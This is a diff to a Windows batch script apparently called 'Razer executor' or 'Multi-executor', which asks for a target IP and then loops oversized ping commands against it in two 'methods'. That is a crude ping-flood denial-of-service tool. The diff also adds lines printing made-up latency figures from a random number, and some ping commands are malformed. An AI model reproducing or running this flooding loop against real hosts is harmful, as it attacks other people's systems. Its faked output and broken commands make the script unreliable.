@@ -19,7 +19,7 @@ goto start
 :Update
 cls
 echo New Update! ( %NewVersion% )
-pause>NUL
+timeout /t 1 > NUL
 echo Downloading...
 echo.
 echo.
@@ -36,15 +36,14 @@ exit
 :start
 cls
 title [BETA] Razer executor by Razerdev (UseRazer) %NewVersion%
-echo.
-echo " _____                    "
-echo "|  __ \                   "
-timeout /t 1 > NUL
-echo "| |__) |__ _ _______ _ __ "
-echo "|  _  // _` |_  / _ \ '__|"
-timeout /t 1 > NUL
-echo "| | \ \ (_| |/ /  __/ |   "
-echo "|_|  \_\__,_/___\___|_|   "
+echo "  __  __       _ _   _                                _             
+echo " |  \/  |     | | | (_)                              | |            
+echo " | \  / |_   _| | |_ _ ______ _____  _____  ___ _   _| |_ ___  _ __ 
+echo " | |\/| | | | | | __| |______/ _ \ \/ / _ \/ __| | | | __/ _ \| '__|
+echo " | |  | | |_| | | |_| |     |  __/>  <  __/ (__| |_| | || (_) | |   
+echo " |_|  |_|\__,_|_|\__|_|      \___/_/\_\___|\___|\__,_|\__\___/|_|   
+timeout /t 1 >NUL
+echo loading database...                                                                                                                                       
 echo. 
 color 1
 color 2
@@ -61,6 +60,7 @@ color 5
 color 6
 color 7
 color 2
+timeout /t 1 >NUL
 echo ready                                                          
 goto G
 :H
@@ -159,7 +159,7 @@ ping %web%
 echo copy ip you got here
 set /p target=IP:
 timeout /t 1 > NUL
-echo choose methode "methode1 / methode2"
+echo choose methode "methode1 (working)/ methode2 (not working)"
 set /p methode=methode:
 pause > NUL
 echo processing...
@@ -167,12 +167,14 @@ timeout /t 2 > NUL
 goto %methode%
 set loop=0
 :methode1
-ping %target% -f -l 65535 -w 1 -n 1
+ping %target% -f –t 65500 -w 1 -n 1
+echo %target% ms:%random%
 set /a loop=%loop%+1
 if "%loop%"=="100" goto next
 goto :methode1
 :methode2
 ping %target% -f -l 65535 127.0.0.1
+echo %target% ms:%random%
 set /a loop=%loop%+1
 if "%loop%"=="100" goto next
 goto :methode2
